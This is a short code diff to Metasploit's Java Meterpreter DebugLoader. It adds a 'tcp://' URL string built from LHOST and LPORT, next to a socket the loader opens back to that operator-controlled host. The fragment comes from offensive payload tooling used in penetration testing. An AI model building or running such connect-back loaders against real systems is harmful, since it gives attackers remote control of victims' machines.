@@ -19,6 +19,7 @@ public class DebugLoader {
             System.out.println("Usage: java com.metasploit.meterpreter.DebugLoader <LHOST> <LPORT> [<RedirectError>]");
             return;
         }
+        String url = "tcp://" + args[0] + ":" + args[1];
         Socket msgsock = new Socket(args[0], Integer.parseInt(args[1]));
         DataInputStream in = new DataInputStream(msgsock.getInputStream());
         OutputStream out = new DataOutputStream(msgsock.getOutputStream());
